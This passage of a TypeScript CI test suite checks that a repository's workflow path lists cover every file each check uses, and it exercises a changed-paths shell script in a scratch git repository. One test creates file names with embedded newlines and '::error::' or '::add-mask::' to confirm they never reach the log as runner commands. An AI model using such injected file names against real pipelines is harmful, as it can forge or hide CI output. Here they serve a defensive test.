function namesIn(text: string): { specifiers: string[]; urls: string[]; goPackages: string[] } {
  return {
    specifiers: [
      ...[...text.matchAll(/\b(?:from|import)\s*\(?\s*["']([^"']+)["']/g)].map((m) => m[1]!),
      ...[...text.matchAll(/<script[^>]*\bsrc="([^"]+)"/g)].map((m) => m[1]!.replace(/^\//, "./")),
    ],
    urls: [...text.matchAll(/new URL\(\s*["'`]((?:\.\.\/)+[^"'`$]*)/g)].map((m) => m[1]!),
    goPackages: [...text.matchAll(/"go",\s*\[[^\]]*?"(\.\/[\w./-]+)"/g)].map((m) => m[1]!),
  };
}

function readBrowserTests(): { used: Set<string>; goPackages: Set<string> } {
  const web = join(REPO, "web");
  const packages = workspacePackages();
  const roots = [
    ...filesUnder(join(web, "src")),
    ...filesUnder(join(web, "test", "e2e")),
    join(web, "test", "worker-card-proof.ts"),
    join(web, "vite.config.ts"),
    ...readdirSync(web)
      .filter((f) => f.endsWith(".html"))
      .map((f) => join(web, f)),
  ].filter((f) => /\.(ts|js|mjs|html)$/.test(f));
  assert.ok(roots.some((f) => f.endsWith("index.html")), "the check read the pages' HTML");
  const top = (path: string): string => relative(REPO, path).split(sep)[0]!;
  const seen = new Set<string>();
  const used = new Set<string>();
  const goPackages = new Set<string>();
  const queue = [...roots];
  while (queue.length > 0) {
    const file = queue.pop()!;
    if (seen.has(file)) continue;
    seen.add(file);
    const text = readFileSync(file, "utf8");
    const names = namesIn(text);
    for (const s of names.specifiers) {
      let target: string | undefined;
      if (s.startsWith(".")) target = resolve(dirname(file), s);
      else {
        const name = [...packages.keys()].find((n) => s === n || s.startsWith(`${n}/`));
        if (name !== undefined) {
          const dir = packages.get(name)!;
          used.add(top(dir));
          const rest = s.slice(name.length + 1);
          // iamreal-protocol's "exports": "./*.ts" is "./src/*.ts".
          target = [join(dir, "src", rest), join(dir, rest)].find((t) => rest !== "" && existsSync(t));
        }
      }
      if (target !== undefined && existsSync(target) && statSync(target).isFile()) queue.push(target);
    }
    for (const m of text.matchAll(/\bjoin\(\s*repo\s*,\s*"([^"/]+)/g)) used.add(m[1]!);
    for (const m of text.matchAll(/\bjoin\(\s*web\s*,\s*"\.\."\s*,\s*"([^"/]+)/g)) used.add(m[1]!);
    for (const m of text.matchAll(/\bjoin\(\s*web\s*,\s*"\.\.\/([^"/]+)/g)) used.add(m[1]!);
    for (const url of names.urls) {
      // `new URL(\`../../${path}\`)` (web/test/vectors.ts) names the repository's root and no more: say so.
      const named = top(resolve(dirname(file), url));
      used.add(named === "" ? `(somewhere in the repository, by ${relative(REPO, file)})` : named);
    }
    for (const g of names.goPackages) goPackages.add(g);
  }
  for (const f of seen) used.add(top(f));
  return { used, goPackages };
}

/** Whether `top`, a top-level directory or file, is in the paths. */
const inPaths = (top: string): boolean => BROWSER_PATHS.includes(existsSync(join(REPO, top)) && statSync(join(REPO, top)).isDirectory() ? `${top}/**` : top);

test("the browser tests run when anything they use changes: each top-level directory and file their source names is in the paths", () => {
  const { used } = readBrowserTests();
  // The check sees the page, the shared rules, the screen's sentences and the back end the tests run against.
  for (const d of ["web", "protocol", "design", "verifier", "worker"]) assert.ok(used.has(d), `the check found ${d}`);
  assert.deepEqual(
    [...used].filter((u) => !inPaths(u)),
    [],
  );
  // What is installed and how: the lockfile and the workspace, and this workflow itself.
  for (const p of ["pnpm-lock.yaml", "pnpm-workspace.yaml", ".github/workflows/checks-browser.yml"]) assert.ok(BROWSER_PATHS.includes(p), p);
});

test("the browser tests and the circuits' check run when a pull request adds a file at the root that changes how every check installs, builds or checks out", () => {
  // Written out (ROOT_FILES, below), not read from ROOT_FILES_PATHS: e.g. a .pnpmfile.cjs can change what
  // @aztec-foundation/bb.js resolves to, and bb comes from it; a .gitattributes can change the bytes of
  // web/circuits/ and verifier/vk/ that rebuild.sh compares.
  for (const [check, list] of Object.entries({ browser: BROWSER_PATHS, circuits: CIRCUITS_PATHS })) {
    assert.deepEqual(
      ROOT_FILES.filter((p) => !list.includes(p)),
      [],
      check,
    );
  }
});

/** Whether `go` runs here. */
const hasGo = ((): boolean => {
  const r = spawnSync("go", ["version"], { encoding: "utf8" });
  return r.error === undefined && r.status === 0;
})();
// Without Go the test of the Go packages is skipped, on a computer. Where the
// whole check is expected (CI, which GitHub Actions sets, or IAMREAL_BB, set
// where the tests that run bb and Go are meant to run) a missing Go fails it
// instead of skipping it.
const goRequired = Boolean(process.env.CI) || Boolean(process.env.IAMREAL_BB);

test(
  "the browser tests run when the Go programs they build change: the directories of those packages and of every package they import are in the paths",
  { skip: !hasGo && !goRequired ? "go is not installed: the Go packages the browser tests build are not looked at" : false },
  () => {
    assert.ok(hasGo, "go is not installed, and CI or IAMREAL_BB is set: this check must run here");
    const { goPackages } = readBrowserTests();
    // The one Go program they build re-verifies what the Worker published (#69).
    assert.deepEqual([...goPackages], ["./cmd/iamreal-verify"], "the check read the Go builds");
    const format = '{{if .Module}}{{if eq .Module.Path "github.com/iamreal-tw/iamreal"}}{{.Dir}}{{end}}{{end}}';
    const dirs = execFileSync("go", ["list", "-tags", "iamrealtest", "-deps", "-f", format, ...goPackages], { cwd: REPO, encoding: "utf8" });
    const used = new Set(["go.mod", "go.sum", ...dirs.split("\n").filter(Boolean).map((d) => relative(REPO, d).split(sep)[0]!)]);
    for (const d of ["verifier", "cmd", "crl", "prooflog"]) assert.ok(used.has(d), `the check found ${d}`);
    assert.deepEqual(
      [...used].filter((u) => !inPaths(u)),
      [],
    );
  },
);

test("the paths of checks-ios.yml hold every file of the repository the iOS tests and check-app.sh read", () => {
  // Found by reading their source: `Repository.data("…")`, `.text("…")` and `.vectors("…")` in
  // ios/Tests/, and the paths check-app.sh compares the app's files with (`<name> <path>` lines
  // and "$repo/<path>"). A path put together some other way is not seen: this is a reminder, like
  // the one for checks-browser.yml.
  const read = new Set<string>();
  const tests = join(REPO, "ios", "Tests");
  for (const f of readdirSync(tests)) {
    const text = readFileSync(join(tests, f), "utf8");
    for (const m of text.matchAll(/Repository\.(?:data|text)\("([^"\\]+)"\)/g)) read.add(m[1]!);
    for (const m of text.matchAll(/(?:Repository\.)?vectors\("([^"\\]+)"\)/g)) read.add(`spec/vectors/${m[1]!}`);
    for (const m of text.matchAll(/: "((?:web|verifier|spec|design|device-core)\/[^"]+)"/g)) read.add(m[1]!);
  }
  const check = readFileSync(join(REPO, "ios", "check-app.sh"), "utf8");
  for (const m of check.matchAll(/^\S+ ((?:web|verifier|design)\/\S+)$/gm)) read.add(m[1]!);
  for (const m of check.matchAll(/\$repo\/([A-Za-z0-9_.\/-]+)/g)) read.add(m[1]!);
  assert.ok(read.has("spec/vectors/scope.json") && read.has("web/circuits/card_proof_rs2048.json") && read.has("design/copy/app.md") && read.has("design/fonts/GenRyuMin2TW-B.otf"), `the check read the sources: ${[...read].join(", ")}`);
  assert.deepEqual([...read].filter((p) => !matchesPaths(IOS_PATHS, p)), []);
});

/**
 * The files and directories of the repository that the sources of circuits/
 * name, found by reading every tracked file of it: in the JavaScript,
 * `join(ROOT, ...)` (ROOT is circuits/, tests/lib/run.mjs) and
 * `join(dirname(fileURLToPath(import.meta.url)), ...)` (the file's
 * directory), with the parts written as strings, and the imports with a
 * relative path; in the shell scripts, `$root/<path>` (rebuild.sh's root is
 * the repository's) and the committed files rebuild.sh compares with
 * (`compare "<path>`, from the root); in a Nargo.toml, `path = "..."`. A
 * path cut short by a value put together at run time (`${circuit}.vk`)
 * stands for its directory. Not seen: a path put together any other way,
 * what nargo, bb and circom read on their own (the Noir libraries nargo
 * fetches by tag, bb's common reference string), and what the zkID commit
 * holds.
 */
function namedByCircuits(): Set<string> {
  const circuits = join(REPO, "circuits");
  const paths = new Set<string>();
  const add = (path: string): void => {
    const found = inRepo(path) ?? inRepo(dirname(path));
    if (found !== undefined) paths.add(found);
  };
  const strings = (args: string): string[] => [...args.matchAll(/"([^"]*)"/g)].map((x) => x[1]!);
  for (const f of trackedFiles("circuits")) {
    const file = join(REPO, f);
    const text = readFileSync(file, "utf8");
    if (/\.(mjs|js)$/.test(f)) {
      for (const m of text.matchAll(/\bjoin\(\s*ROOT\s*((?:,\s*"[^"]*"\s*)+)/g)) add(resolve(circuits, ...strings(m[1]!)));
      for (const m of text.matchAll(/\bjoin\(\s*dirname\(fileURLToPath\(import\.meta\.url\)\)\s*((?:,\s*"[^"]*"\s*)+)/g)) add(resolve(dirname(file), ...strings(m[1]!)));
      for (const s of namesIn(text).specifiers) if (s.startsWith(".")) add(resolve(dirname(file), s));
    } else if (f.endsWith(".sh")) {
      for (const m of text.matchAll(/\$root\/([A-Za-z0-9_./-]+)/g)) add(join(REPO, m[1]!));
      for (const m of text.matchAll(/\bcompare "([A-Za-z0-9_./-]+)/g)) add(join(REPO, m[1]!));
    } else if (f.endsWith("Nargo.toml")) {
      for (const m of text.matchAll(/\bpath\s*=\s*"([^"]+)"/g)) add(resolve(dirname(file), m[1]!));
    }
  }
  return paths;
}

test("the paths of checks-circuits.yml hold every file of the repository the rebuild and the tests of circuits/ use", () => {
  const named = namedByCircuits();
  for (const p of ["spec/vectors/poseidon2.json", "web/scripts/strip-circuit.mjs", "web/circuits", "verifier/vk", "circuits/lib", "circuits/tests/lib/run.mjs"]) assert.ok(named.has(p), `the check found ${p}: ${[...named].join(", ")}`);
  const missing = (list: readonly string[]): string[] => [...named].filter((p) => !holds(list, p));
  assert.deepEqual(missing(CIRCUITS_PATHS), []);
  // And a list without one of them is caught.
  assert.deepEqual(missing(CIRCUITS_PATHS.filter((p) => p !== "web/scripts/strip-circuit.mjs")), ["web/scripts/strip-circuit.mjs"]);
  // What is installed, and the workflow itself.
  for (const p of ["pnpm-lock.yaml", "pnpm-workspace.yaml", ".github/workflows/checks-circuits.yml"]) assert.ok(CIRCUITS_PATHS.includes(p), p);
});

test("the committed comparison table has a circom verdict for every case: checks-circuits.yml requires the run's table to be this one, so a run whose circom column says \"not run\" fails", () => {
  // circuits/tests/equivalence.test.mjs writes the table: a header row, a row of ---, then one row per
  // case, the circom column sixth.
  const table = readFileSync(join(REPO, "circuits", "results", "equivalence.md"), "utf8");
  const rows = table
    .split("\n")
    .filter((l) => l.startsWith("| "))
    .map((l) => l.slice(2, -2).split(" | "));
  assert.equal(rows[0]![5], "circom");
  const verdicts = rows.slice(2).map((r) => r[5]!);
  assert.equal(String(verdicts.length), /^(\d+) cases;/m.exec(table)?.[1], "one row per case");
  assert.deepEqual(
    verdicts.filter((v) => !["accept", "reject", "same"].includes(v)),
    [],
  );
});

// Skipping by path (#206): the lists of the four required checks, the script that reads them, and
// what each check uses.

test("the lists of the required checks: one for each, every one with the paths every check has, in the two forms the script reads", () => {
  const files = realFiles();
  const withList = (check: string, list: readonly string[]): CheckLists => ({ ...CHECK_PATHS, [check]: list });
  const without = (check: string, path: string): CheckLists => {
    assert.ok(CHECK_PATHS[check]!.includes(path), `${check} has ${path}`);
    return withList(check, CHECK_PATHS[check]!.filter((p) => p !== path));
  };
  // Each altered set of lists is turned away, for what is wrong with the lists.
  for (const [what, lists] of Object.entries({
    "a list without the lockfile": without("android", "pnpm-lock.yaml"),
    "a list without the workflow": without("go", ".github/workflows/checks.yml"),
    "a list without these rules": without("device-core", "worker/test/workflows.ts"),
    "a pattern with one star, which the script does not read": withList("typescript", [...CHECK_PATHS.typescript!, "web/*.ts"]),
    "a pattern with ** in the middle": withList("typescript", [...CHECK_PATHS.typescript!, "web/**/x.ts"]),
    "a negated pattern": withList("go", [...CHECK_PATHS.go!, "!web/README.md"]),
    "a pattern from the root": withList("go", [...CHECK_PATHS.go!, "/cmd/**"]),
    "a pattern for everything": withList("go", [...CHECK_PATHS.go!, "**"]),
    "a pattern with a space, which would be two in the env": withList("go", [...CHECK_PATHS.go!, "cmd/a b"]),
    "no list for a check": Object.fromEntries(Object.entries(CHECK_PATHS).filter(([c]) => c !== "android")),
  })) {
    const problems = workflowProblems(files, lists);
    assert.ok(problems.some((x) => /is not in the list|not a path or <directory>|not one for each required check/.test(x)), `${what}: ${problems.join("; ")}`);
  }
  // A file hashed into the key of a job's caches changes what the job restores: a pull request
  // that changes it runs the job. Each altered list leaves out one such file.
  for (const [check, list, file] of [
    ["device-core", CHECK_PATHS["device-core"]!.filter((p) => p !== ".github/workflows/cache.yml"), ".github/workflows/cache.yml"],
    ["android", CHECK_PATHS.android!.filter((p) => p !== ".github/workflows/cache.yml"), ".github/workflows/cache.yml"],
    ["android", CHECK_PATHS.android!.filter((p) => p !== "device-core/**"), "device-core/Cargo.lock"],
    ["android", CHECK_PATHS.android!.map((p) => (p === "android/**" ? "android/app/**" : p)), "android/gradle/verification-metadata.xml"],
    ["device-core", CHECK_PATHS["device-core"]!.map((p) => (p === "device-core/**" ? "device-core/checks/**" : p)), "device-core/rust-toolchain.toml"],
  ] as const) {
    const problems = workflowProblems(files, withList(check, list));
    assert.ok(problems.some((x) => x.includes(`${check}: ${file} is in the key of a cache the job restores, and not in the list`)), `${check} without ${file}: ${problems.join("; ")}`);
  }
  // A directory written without /**: the script takes it for one file's name, and it matches nothing.
  const isDirectory = (path: string): boolean => existsSync(join(REPO, path)) && statSync(join(REPO, path)).isDirectory();
  assert.ok(isDirectory("spec/vectors") && !isDirectory("go.mod"), "the check sees the repository's directories");
  for (const [check, path] of [
    ["go", "spec/vectors"],
    ["android", "device-core"],
    ["typescript", ".github/workflows"],
  ] as const) {
    const problems = pathsProblems(withList(check, [...CHECK_PATHS[check]!, path]), isDirectory);
    assert.ok(problems.some((x) => x.includes(`${check}: a directory without /**: ${path}`)), `${check} ${path}: ${problems.join("; ")}`);
  }
  assert.deepEqual(pathsProblems(CHECK_PATHS, isDirectory), []);
  // Written out, not read from EVERY_CHECK_PATHS: what the ticket says is in every list, the script, and
  // the files at the root that, once added, change how every check installs, builds or checks out.
  for (const p of [".github/workflows/checks.yml", ".github/workflows/changed-paths.sh", "worker/test/workflows.ts", "worker/test/workflows.test.ts", "pnpm-lock.yaml", "pnpm-workspace.yaml", "go.mod", "go.sum", ...ROOT_FILES]) {
    assert.ok(EVERY_CHECK_PATHS.includes(p), p);
    for (const check of REQUIRED_CHECKS) assert.ok(CHECK_PATHS[check]!.includes(p), `${check}: ${p}`);
  }
});

test(".github/workflows/ holds the workflows and the scripts they run", () => {
  assert.deepEqual(readdirSync(WORKFLOWS_DIR).sort(), [...WORKFLOW_FILES, ...SCRIPTS].sort());
  // Like the workflows: printable ASCII only. They are read line by line with them (CONTRIBUTING.md).
  for (const f of SCRIPTS) assert.equal(/[^\x20-\x7e\n]/.exec(readFileSync(join(WORKFLOWS_DIR, f), "utf8")), null, f);
});

/** Files at the root that are not there now, and that would change every check if a pull request added them. */
const ROOT_FILES = [".npmrc", ".pnpmfile.cjs", "package.json", "go.work", "go.work.sum", ".cargo/config.toml", ".gitattributes"];

/** The lists as the changes job of checks.yml is given them: the `*_PATHS` of its env. */
function listsOfTheChangesJob(): Record<string, string> {
  const doc = readYaml(realFiles()[C]!) as { jobs: Record<string, { env: Record<string, string> }> };
  const lists = Object.fromEntries(Object.entries(doc.jobs[CHANGES_JOB]!.env).filter(([k]) => k.endsWith("_PATHS")));
  assert.deepEqual(Object.keys(lists), REQUIRED_CHECKS.map(pathsEnvName));
  return lists;
}

test("changed-paths.sh, with the lists the changes job is given: a check runs when the pull request changes a file of its list, and every check runs in the merge queue", (t) => {
  const dir = mkdtempSync(join(tmpdir(), "iamreal-changed-paths-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const gitEnv = {
    PATH: process.env.PATH ?? "",
    HOME: dir,
    GIT_CONFIG_GLOBAL: "/dev/null",
    GIT_CONFIG_NOSYSTEM: "1",
    GIT_AUTHOR_NAME: "a",
    GIT_AUTHOR_EMAIL: "a@example.invalid",
    GIT_COMMITTER_NAME: "a",
    GIT_COMMITTER_EMAIL: "a@example.invalid",
  };
  const repo = join(dir, "repo");
  mkdirSync(repo);
  const git = (...args: string[]): string => execFileSync("git", args, { cwd: repo, env: gitEnv, encoding: "utf8" }).trim();
  const write = (path: string, text: string): void => {
    mkdirSync(dirname(join(repo, path)), { recursive: true });
    writeFileSync(join(repo, path), text);
  };
  const commit = (message: string): string => {
    git("add", "--all");
    git("commit", "--quiet", "--message", message);
    return git("rev-parse", "HEAD");
  };
  git("init", "--quiet", "--initial-branch=main");
  for (const f of ["README.md", "crl/old.go", "device-core/gone.rs", "web/page.ts", "docs/a.md"]) write(f, "1\n");
  const fork = commit("where the pull request starts");
  // The base branch moves on after the pull request started: that change is not the pull request's.
  write("web/page.ts", "2\n");
  write("android/new.kt", "2\n");
  const base = commit("the base branch, later");

  const script = join(WORKFLOWS_DIR, CHANGED_PATHS_NAME);
  const lists = listsOfTheChangesJob();
  let n = 0;
  const run = (env: Record<string, string>, given: Record<string, string> = lists): { status: number | null; outputs: Record<string, string>; log: string } => {
    const output = join(dir, `output-${n++}`);
    writeFileSync(output, "");
    const r = spawnSync("bash", [script], { cwd: repo, env: { ...gitEnv, ...given, GITHUB_OUTPUT: output, ...env }, encoding: "utf8" });
    const lines = readFileSync(output, "utf8").split("\n").filter(Boolean);
    return { status: r.status, outputs: Object.fromEntries(lines.map((l) => l.split("=") as [string, string])), log: r.stdout + r.stderr };
  };
  const ALL = [...REQUIRED_CHECKS];
  const every = (value: string): Record<string, string> => Object.fromEntries(ALL.map((c) => [c, value]));
  type Op = (() => void) | string;
  const remove = (path: string) => (): void => rmSync(join(repo, path));
  const move = (from: string, to: string) => (): void => {
    mkdirSync(dirname(join(repo, to)), { recursive: true });
    renameSync(join(repo, from), join(repo, to));
  };
  // Each case: what the pull request does (a path is a file written), and the checks that run. The
  // expected checks are written out here, not worked out from the lists.
  const cases: [string, Op[], string[]][] = [
    ["documents only", ["docs/b.md", "README.md", "docs/adr/0001-x.md", "CONTRIBUTING.md", ".github/README.md"], []],
    ["a document whose name has a space and characters outside ASCII", ["docs/文件 說明.md"], []],
    ["a vector whose name has a space and characters outside ASCII", ["spec/vectors/文 件.json"], ALL],
    ["go.mod", ["go.mod"], ALL],
    ["a go.mod that is not the root's", ["docs/go.mod"], []],
    ["the lockfile", ["pnpm-lock.yaml"], ALL],
    ["the workflow", [".github/workflows/checks.yml"], ALL],
    ["the script", [".github/workflows/changed-paths.sh"], ALL],
    ["the rules", ["worker/test/workflows.ts"], ALL],
    ["another workflow", [".github/workflows/checks-ios.yml"], ["typescript"]],
    ["the workflow that saves the caches the device-core and android jobs restore", [".github/workflows/cache.yml"], ["typescript", "device-core", "android"]],
    ["the Worker", ["worker/src/x.ts"], ["typescript"]],
    ["the page", ["web/src/x.ts"], ["typescript"]],
    ["the page's README, whose headers worker/'s tests read", ["web/README.md"], ["typescript"]],
    ["the app for Android", ["android/app/x.kt"], ["typescript", "android"]],
    ["the app for iOS", ["ios/x.swift"], ["typescript"]],
    ["the Rust core", ["device-core/checks/src/x.rs"], ["typescript", "device-core", "android"]],
    ["a file of the Rust core deleted", [remove("device-core/gone.rs")], ["typescript", "device-core", "android"]],
    ["a Go file moved out to docs/: it counts under its old name", [move("crl/old.go", "docs/old.go")], ["go", "typescript"]],
    ["the copy", ["design/copy/app.md"], ["go", "typescript", "android"]],
    ["a specification", ["spec/record-rules.md"], ["go", "typescript", "device-core"]],
    ["the circuits", ["web/circuits/x.json"], ["typescript", "device-core", "android"]],
    ["a directory whose name starts like one of a list", ["specs/x.md", "webx/y.ts", "cmd.md"], []],
    ["a document and the Worker", ["docs/b.md", "worker/src/x.ts"], ["typescript"]],
    ...ROOT_FILES.map((f): [string, Op[], string[]] => [`${f} at the root`, [f], ALL]),
    ["a package.json and a .cargo/config.toml that are not the root's", ["docs/package.json", "docs/.cargo/config.toml"], []],
    ["nothing", [], []],
  ];
  let head = fork;
  for (const [what, ops, runs] of cases) {
    git("checkout", "--quiet", "--force", "-B", "pr", fork);
    git("clean", "--quiet", "-fd");
    for (const op of ops) typeof op === "string" ? write(op, "changed\n") : op();
    head = ops.length === 0 ? fork : commit(what);
    const r = run({ EVENT_NAME: "pull_request", BASE_SHA: base, HEAD_SHA: head });
    assert.equal(r.status, 0, `${what}: ${r.log}`);
    assert.deepEqual(r.outputs, Object.fromEntries(ALL.map((c) => [c, String(runs.includes(c))])), `${what}: ${r.log}`);
    // The rules' own reading of the lists says the same.
    const changed = execFileSync("git", ["diff", "--name-only", "--no-renames", "-z", `${base}...${head}`], { cwd: repo, env: gitEnv, encoding: "utf8" }).split("\0").filter(Boolean);
    assert.deepEqual(
      ALL.filter((c) => changed.some((f) => matchesPaths(CHECK_PATHS[c]!, f))),
      runs,
      what,
    );
  }

  // A file name is the pull request's to choose: one with a new line and `::` in it must not reach
  // the log as a line of its own, where the runner would take it for a workflow command.
  git("checkout", "--quiet", "--force", "-B", "pr", fork);
  git("clean", "--quiet", "-fd");
  write("spec/x\n::error::made up.md", "changed\n");
  write("docs/y\n::add-mask::z.md", "changed\n");
  const odd = run({ EVENT_NAME: "pull_request", BASE_SHA: base, HEAD_SHA: commit("file names with a new line") });
  assert.equal(odd.status, 0, odd.log);
  assert.deepEqual(odd.outputs, { go: "true", typescript: "true", "device-core": "true", android: "false" });
  assert.deepEqual(
    odd.log.split("\n").filter((l) => !/^(go|typescript|device-core|android): (runs|skipped) \(/.test(l) && l !== ""),
    [],
    odd.log,
  );
  assert.ok(!/[^\x20-\x7e\n]/.test(odd.log) && odd.log.includes("spec/x"), odd.log);
  git("checkout", "--quiet", "--force", "-B", "pr", fork);
  git("clean", "--quiet", "-fd");
  head = fork;

  // The merge queue: every check, and no commit is looked at.
  const queue = run({ EVENT_NAME: "merge_group", BASE_SHA: "", HEAD_SHA: "" });
  assert.equal(queue.status, 0, queue.log);
  assert.deepEqual(queue.outputs, every("true"));
  // Any other event too: only pull_request skips. `head` here changes nothing of any list.
  assert.deepEqual(run({ EVENT_NAME: "pull_request", BASE_SHA: base, HEAD_SHA: head }).outputs, every("false"));
  assert.deepEqual(run({ EVENT_NAME: "push", BASE_SHA: base, HEAD_SHA: head }).outputs, every("true"));

  // What goes wrong stops the script, so that the changes job fails and the required checks with it.
  const pr = { EVENT_NAME: "pull_request", BASE_SHA: base, HEAD_SHA: head };
  const { ANDROID_PATHS: _android, ...withoutAndroid } = lists;
  const failures: [string, Record<string, string>, Record<string, string>?][] = [
    ["a base commit that is not there", { ...pr, BASE_SHA: "0123456789abcdef0123456789abcdef01234567" }],
    ["no base commit", { ...pr, BASE_SHA: "" }],
    ["no head commit", { ...pr, HEAD_SHA: "" }],
    ["no event name", { ...pr, EVENT_NAME: "" }],
    ["a pattern with one star", { ...pr, ANDROID_PATHS: "android/** web/*.ts" }],
    ["a pattern with ** in the middle", { ...pr, GO_PATHS: "cmd/**/x.go" }],
    ["a pattern for everything", { ...pr, GO_PATHS: "**" }],
    ["a pattern that goes up", { ...pr, GO_PATHS: "cmd/../docs/**" }],
    ["a pattern that starts by going up", { ...pr, GO_PATHS: "../x" }],
    ["a pattern from the root", { ...pr, GO_PATHS: "/cmd/**" }],
    ["a pattern with an empty part", { ...pr, GO_PATHS: "cmd//x.go" }],
    ["a pattern that ends with a slash", { ...pr, GO_PATHS: "cmd/" }],
    ["an empty list", { ...pr, DEVICE_CORE_PATHS: "" }],
    ["a list that is not given", pr, withoutAndroid],
  ];
  for (const [what, env, given] of failures) {
    const r = run(env, given);
    assert.notEqual(r.status, 0, `${what}: ${r.log}`);
    assert.notDeepEqual(Object.keys(r.outputs), ALL, `${what}: the script wrote an answer for every check`);
  }
});

/** The tracked files under `dirs`, from the repository's root. */
function trackedFiles(...dirs: string[]): string[] {
  const found = execFileSync("git", ["-C", REPO, "ls-files", "-z", "--", ...dirs], { encoding: "utf8" }).split("\0").filter(Boolean);
  assert.ok(found.length > 0, `the check read the tracked files of ${dirs.join(", ")}`);
  return found;
}

let tracked: Set<string> | undefined;

/**
 * `path` from the repository's root, if it is a tracked file or a directory
 * with a tracked file under it, other than the root; else nothing. Every
 * check below finds its paths with this. Only what is tracked: a path that
 * is on disk but not tracked (.env.local, an output directory) is not one
 * CI has, and counting it would make the checks fail where it is (#314).
 */
function inRepo(path: string): string | undefined {
  if (tracked === undefined) {
    tracked = new Set();
    for (const f of trackedFiles()) for (let p = f; p !== "."; p = dirname(p)) tracked.add(p);
  }
  const r = relative(REPO, path).split(sep).join("/");
  return tracked.has(r) ? r : undefined;
}

/** Whether `list` holds `path`: a file, or a directory, every file of which it must then hold. */
const holds = (list: readonly string[], path: string): boolean => matchesPaths(list, path) || matchesPaths(list, `${path}/`);

/**
 * The files and directories of the repository that TypeScript sources name,
 * and the Go packages they build, test or run. Found by reading `files`
 * (.ts, .mjs, .js, .html), the same writings as the check of the browser
 * tests' paths above, on every tracked source and not only the ones the
 * browser tests reach:
 * - an import with a relative path, or with the name of a package of the
 *   workspace; the HTML's `<script src>`;
 * - `join(<base>, "<part>", ...)` where the base is `REPO` or `repo` (the
 *   root), `WORKER_DIR` (worker/), `web` (web/) or `here` (the file's
 *   directory), the names these sources use, with the parts written as
 *   strings;
 * - `new URL("../...", import.meta.url)`, up to the first `${`;
 * - `"go", [... "./<package>"`.
 * A path that names no tracked file or directory of the repository (an
 * output directory, .env.local, the root itself) is left out. Not seen:
 * what the check of the browser tests' paths does not see either
 * (.github/README.md).
 */
function namedByTypeScript(files: readonly string[]): { paths: Set<string>; goPackages: Set<string> } {
  const packages = workspacePackages();
  const bases: Record<string, (file: string) => string> = { REPO: () => REPO, repo: () => REPO, WORKER_DIR: () => WORKER_DIR, web: () => join(REPO, "web"), here: dirname };
  const paths = new Set<string>();
  const goPackages = new Set<string>();
  /** A path, or where it stops in the middle of a name (`../spec/vectors/${name}`), the directory it is in. */
  const add = (path: string): void => {
    const found = inRepo(path) ?? inRepo(dirname(path));
    if (found !== undefined) paths.add(found);
  };
  for (const f of files.filter((x) => /\.(ts|mjs|js|html)$/.test(x))) {
    const file = join(REPO, f);
    const text = readFileSync(file, "utf8");
    const names = namesIn(text);
    for (const s of names.specifiers) {
      if (s.startsWith(".")) add(resolve(dirname(file), s));
      else {
        const name = [...packages.keys()].find((n) => s === n || s.startsWith(`${n}/`));
        if (name !== undefined) add(packages.get(name)!);
      }
    }
    for (const m of text.matchAll(/\bjoin\(\s*(REPO|repo|WORKER_DIR|web|here)\s*((?:,\s*"[^"]*"\s*)+)/g)) {
      const found = inRepo(resolve(bases[m[1]!]!(file), ...[...m[2]!.matchAll(/"([^"]*)"/g)].map((x) => x[1]!)));
      if (found !== undefined) paths.add(found);
    }
    for (const url of names.urls) add(resolve(dirname(file), url));
    for (const g of names.goPackages) goPackages.add(g);
  }
  return { paths, goPackages };
}

/**
 * The files and directories of the repository that Go sources name outside
 * their own directory: a string that starts with `../`, and
 * `filepath.Join("..", "<part>", ...)` with the parts written as strings,
 * both from the file's directory (where `go test` runs a package's tests).
 * Not seen: a path put together any other way, and what a test is handed
 * through the environment.
 */
function namedByGo(files: readonly string[]): Set<string> {
  const paths = new Set<string>();
  for (const f of files.filter((x) => x.endsWith(".go"))) {
    const file = join(REPO, f);
    const text = readFileSync(file, "utf8");
    const add = (path: string): void => {
      const found = inRepo(resolve(dirname(file), path));
      if (found !== undefined) paths.add(found);
    };
    for (const m of text.matchAll(/"((?:\.\.\/)+[^"\s]*)"/g)) add(m[1]!);
    for (const m of text.matchAll(/filepath\.Join\(\s*("\.\."\s*(?:,\s*"[^"]*"\s*)*)/g)) add([...m[1]!.matchAll(/"([^"]*)"/g)].map((x) => x[1]!).join("/"));
  }
  return paths;
}

/** The directories, from the root, of the packages of this module that `packages` are or import, their tests' imports included. */
function goDirectories(packages: readonly string[]): string[] {
  const format = '{{if .Module}}{{if eq .Module.Path "github.com/iamreal-tw/iamreal"}}{{.Dir}}{{end}}{{end}}';
  const dirs = execFileSync("go", ["list", "-tags", "iamrealtest", "-test", "-deps", "-f", format, ...packages], { cwd: REPO, encoding: "utf8" });
  return [...new Set(dirs.split("\n").filter(Boolean).map((d) => relative(REPO, d).split(sep).join("/")))];
}

/**
 * The go list patterns of this module's packages: `./<dir>/...` for each top-level directory with tracked Go
 * sources, `.` if the root has some. Not `./...`: that walks every directory, the untracked ones too, and the
 * tests running at once make and delete directories under worker/test-output/ while go list reads the tree
 * (#304). `./worker/...` would walk it again, so worker/ must have no Go sources.
 */
function goPackagePatterns(): string[] {
  const patterns = [...new Set(trackedFiles("*.go").map((f) => (f.includes("/") ? `./${f.split("/")[0]}/...` : ".")))].sort();
  assert.ok(!patterns.includes("./worker/..."), "worker/ has Go sources: go list would walk worker/test-output/, which the tests running at once change (#304)");
  return patterns;
}

const skipWithoutGo = (what: string): { skip: string | false } => ({ skip: !hasGo && !goRequired ? `go is not installed: ${what}` : false });

test("the go check runs when anything it uses changes: every directory with a Go package, and every file their sources name, is in its list", skipWithoutGo("the Go packages are not looked at"), () => {
  assert.ok(hasGo, "go is not installed, and CI or IAMREAL_BB is set: this check must run here");
  const list = CHECK_PATHS.go!;
  const dirs = goDirectories(goPackagePatterns());
  for (const d of ["verifier", "cmd/iamreal-verify", "crl", "prooflog"]) assert.ok(dirs.includes(d), `the check found ${d}`);
  const named = namedByGo(trackedFiles(...new Set(dirs.map((d) => d.split("/")[0]!))));
  for (const p of ["spec/vectors", "design/copy/verify.md", "spec/record-rules.md"]) assert.ok(named.has(p), `the check found ${p}: ${[...named].join(", ")}`);
  assert.deepEqual(
    [...dirs, ...named].filter((p) => !holds(list, p)),
    [],
  );
});

test("every check that runs pnpm install at the root runs when a package of the workspace changes its package.json: pnpm compares the lockfile with each", () => {
  const packages = [...workspacePackages().values()].map((dir) => `${relative(REPO, dir).split(sep).join("/")}/package.json`);
  assert.ok(packages.includes("circuits/package.json"), `the check read the workspace: ${packages.join(", ")}`);
